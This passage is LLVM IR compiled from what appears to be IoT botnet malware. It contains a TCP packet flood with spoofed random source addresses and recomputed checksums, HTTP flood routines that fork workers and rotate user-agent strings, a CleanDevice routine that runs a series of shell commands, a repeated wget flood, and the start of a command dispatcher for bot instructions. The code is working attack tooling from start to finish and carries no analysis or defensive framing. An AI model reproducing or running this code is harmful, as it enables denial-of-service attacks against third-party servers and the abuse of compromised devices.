  %240 = call i32 @strcmp(i8* %239, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %250, label %242

; <label>:242:                                    ; preds = %238
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon* %244 to %struct.anon.0*
  %246 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %247, -4097
  %249 = or i16 %248, 4096
  store i16 %249, i16* %246, align 4
  br label %277

; <label>:250:                                    ; preds = %238
  %251 = load i8*, i8** %23, align 8
  %252 = call i32 @strcmp(i8* %251, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #9
  %253 = icmp ne i32 %252, 0
  br i1 %253, label %262, label %254

; <label>:254:                                    ; preds = %250
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon* %256 to %struct.anon.0*
  %258 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = and i16 %259, -2049
  %261 = or i16 %260, 2048
  store i16 %261, i16* %258, align 4
  br label %276

; <label>:262:                                    ; preds = %250
  %263 = load i8*, i8** %23, align 8
  %264 = call i32 @strcmp(i8* %263, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.161, i32 0, i32 0)) #9
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %274, label %266

; <label>:266:                                    ; preds = %262
  %267 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %271, -8193
  %273 = or i16 %272, 8192
  store i16 %273, i16* %270, align 4
  br label %275

; <label>:274:                                    ; preds = %262
  br label %275

; <label>:275:                                    ; preds = %274, %266
  br label %276

; <label>:276:                                    ; preds = %275, %254
  br label %277

; <label>:277:                                    ; preds = %276, %242
  br label %278

; <label>:278:                                    ; preds = %277, %230
  br label %279

; <label>:279:                                    ; preds = %278, %218
  br label %280

; <label>:280:                                    ; preds = %279, %206
  %281 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %281, i8** %23, align 8
  br label %199

; <label>:282:                                    ; preds = %199
  br label %283

; <label>:283:                                    ; preds = %282, %181
  %284 = call i32 @rand_cmwc()
  %285 = trunc i32 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 0
  %288 = bitcast %union.anon* %287 to %struct.anon.0*
  %289 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %288, i32 0, i32 5
  store i16 %285, i16* %289, align 2
  %290 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon* %291 to %struct.anon.0*
  %293 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %292, i32 0, i32 6
  store i16 0, i16* %293, align 4
  %294 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon* %295 to %struct.anon.0*
  %297 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %296, i32 0, i32 7
  store i16 0, i16* %297, align 2
  %298 = load i32, i32* %9, align 4
  %299 = icmp eq i32 %298, 0
  br i1 %299, label %300, label %302

; <label>:300:                                    ; preds = %283
  %301 = call i32 @rand_cmwc()
  br label %307

; <label>:302:                                    ; preds = %283
  %303 = load i32, i32* %9, align 4
  %304 = trunc i32 %303 to i16
  %305 = call zeroext i16 @htons(i16 zeroext %304) #10
  %306 = zext i16 %305 to i32
  br label %307

; <label>:307:                                    ; preds = %302, %300
  %308 = phi i32 [ %301, %300 ], [ %306, %302 ]
  %309 = trunc i32 %308 to i16
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 1
  store i16 %309, i16* %313, align 2
  %314 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %315 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %316 = call zeroext i16 @tcpcsum(%struct.iphdr* %314, %struct.tcphdr* %315)
  %317 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %318 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %317, i32 0, i32 0
  %319 = bitcast %union.anon* %318 to %struct.anon.0*
  %320 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %319, i32 0, i32 6
  store i16 %316, i16* %320, align 4
  %321 = bitcast i8* %73 to i16*
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 2
  %324 = load i16, i16* %323, align 2
  %325 = zext i16 %324 to i32
  %326 = call zeroext i16 @csum(i16* %321, i32 %325)
  %327 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 7
  store i16 %326, i16* %328, align 2
  %329 = call i64 @time(i64* null) #5
  %330 = load i32, i32* %10, align 4
  %331 = sext i32 %330 to i64
  %332 = add nsw i64 %329, %331
  %333 = trunc i64 %332 to i32
  store i32 %333, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %334

; <label>:334:                                    ; preds = %388, %387, %307
  br label %335

; <label>:335:                                    ; preds = %334
  %336 = load i32, i32* %17, align 4
  %337 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %338 = call i64 @sendto(i32 %336, i8* %73, i64 %71, i32 0, %struct.sockaddr* %337, i32 16)
  %339 = load i32, i32* %19, align 4
  %340 = call i32 @getRandomIP(i32 %339)
  %341 = call i32 @htonl(i32 %340) #10
  %342 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  %344 = call i32 @rand_cmwc()
  %345 = trunc i32 %344 to i16
  %346 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 3
  store i16 %345, i16* %347, align 4
  %348 = call i32 @rand_cmwc()
  %349 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %350 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %349, i32 0, i32 0
  %351 = bitcast %union.anon* %350 to %struct.anon.0*
  %352 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %351, i32 0, i32 2
  store i32 %348, i32* %352, align 4
  %353 = call i32 @rand_cmwc()
  %354 = trunc i32 %353 to i16
  %355 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  %357 = bitcast %union.anon* %356 to %struct.anon.0*
  %358 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %357, i32 0, i32 0
  store i16 %354, i16* %358, align 4
  %359 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %360 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %359, i32 0, i32 0
  %361 = bitcast %union.anon* %360 to %struct.anon.0*
  %362 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %361, i32 0, i32 6
  store i16 0, i16* %362, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %364 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %365 = call zeroext i16 @tcpcsum(%struct.iphdr* %363, %struct.tcphdr* %364)
  %366 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon* %367 to %struct.anon.0*
  %369 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %368, i32 0, i32 6
  store i16 %365, i16* %369, align 4
  %370 = bitcast i8* %73 to i16*
  %371 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 2
  %373 = load i16, i16* %372, align 2
  %374 = zext i16 %373 to i32
  %375 = call zeroext i16 @csum(i16* %370, i32 %374)
  %376 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 7
  store i16 %375, i16* %377, align 2
  %378 = load i32, i32* %25, align 4
  %379 = load i32, i32* %15, align 4
  %380 = icmp eq i32 %378, %379
  br i1 %380, label %381, label %388

; <label>:381:                                    ; preds = %335
  %382 = call i64 @time(i64* null) #5
  %383 = load i32, i32* %24, align 4
  %384 = sext i32 %383 to i64
  %385 = icmp sgt i64 %382, %384
  br i1 %385, label %386, label %387

; <label>:386:                                    ; preds = %381
  br label %391

; <label>:387:                                    ; preds = %381
  store i32 0, i32* %25, align 4
  br label %334

; <label>:388:                                    ; preds = %335
  %389 = load i32, i32* %25, align 4
  %390 = add i32 %389, 1
  store i32 %390, i32* %25, align 4
  br label %334

; <label>:391:                                    ; preds = %386
  %392 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %392)
  br label %393

; <label>:393:                                    ; preds = %391, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %67, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %70

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #5
  %34 = srem i32 %33, 59
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #5
  %39 = call i32 @fork() #5
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %66

; <label>:41:                                     ; preds = %28
  br label %42

; <label>:42:                                     ; preds = %64, %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = call i64 @time(i64* null) #5
  %46 = icmp sgt i64 %44, %45
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #9
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %53, %47
  br label %42

; <label>:65:                                     ; preds = %42
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %28
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %24

; <label>:70:                                     ; preds = %24
  ret void
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([285 x i8], [285 x i8]* @.str.164, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %70, %6
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %73

; <label>:31:                                     ; preds = %27
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @rand() #5
  %37 = srem i32 %36, 59
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %33, i8* %34, i8* %35, i8* %40) #5
  %42 = call i32 @fork() #5
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %69

; <label>:44:                                     ; preds = %31
  br label %45

; <label>:45:                                     ; preds = %67, %44
  %46 = load i32, i32* %15, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @time(i64* null) #5
  %49 = icmp sgt i64 %47, %48
  br i1 %49, label %50, label %68

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %67

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %13, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = call i64 @strlen(i8* %59) #9
  %61 = call i64 @write(i32 %57, i8* %58, i64 %60)
  %62 = load i32, i32* %13, align 4
  %63 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %64 = call i64 @read(i32 %62, i8* %63, i64 1)
  %65 = load i32, i32* %13, align 4
  %66 = call i32 @close(i32 %65)
  br label %67

; <label>:67:                                     ; preds = %56, %50
  br label %45

; <label>:68:                                     ; preds = %45
  call void @exit(i32 0) #12
  unreachable

; <label>:69:                                     ; preds = %31
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %14, align 4
  br label %27

; <label>:73:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPTXT(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.165, i32 0, i32 0)) #5
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %70, %6
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %73

; <label>:31:                                     ; preds = %27
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @rand() #5
  %37 = srem i32 %36, 59
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i32 0, i32 0), i8* %33, i8* %34, i8* %35, i8* %40) #5
  %42 = call i32 @fork() #5
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %69

; <label>:44:                                     ; preds = %31
  br label %45

; <label>:45:                                     ; preds = %67, %44
  %46 = load i32, i32* %15, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @time(i64* null) #5
  %49 = icmp sgt i64 %47, %48
  br i1 %49, label %50, label %68

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %67

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %13, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = call i64 @strlen(i8* %59) #9
  %61 = call i64 @write(i32 %57, i8* %58, i64 %60)
  %62 = load i32, i32* %13, align 4
  %63 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %64 = call i64 @read(i32 %62, i8* %63, i64 1)
  %65 = load i32, i32* %13, align 4
  %66 = call i32 @close(i32 %65)
  br label %67

; <label>:67:                                     ; preds = %56, %50
  br label %45

; <label>:68:                                     ; preds = %45
  call void @exit(i32 0) #12
  unreachable

; <label>:69:                                     ; preds = %31
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %14, align 4
  br label %27

; <label>:73:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.166, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.167, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.169, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.170, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.171, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.173, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.174, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.175, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.176, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.177, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @SendWGET(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i64 @time(i64* null) #5
  %9 = load i32, i32* %4, align 4
  %10 = sext i32 %9 to i64
  %11 = add nsw i64 %8, %10
  %12 = trunc i64 %11 to i32
  store i32 %12, i32* %5, align 4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.179, i32 0, i32 0)) #5
  %15 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %16 = load i8*, i8** %3, align 8
  %17 = call i8* @strcat(i8* %15, i8* %16) #5
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

; <label>:20:                                     ; preds = %25, %2
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = call i64 @time(i64* null) #5
  %24 = icmp sgt i64 %22, %23
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %27 = call i32 @system(i8* %26)
  br label %20

; <label>:28:                                     ; preds = %20
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %43, label %42

; <label>:42:                                     ; preds = %2
  br label %681

; <label>:43:                                     ; preds = %2
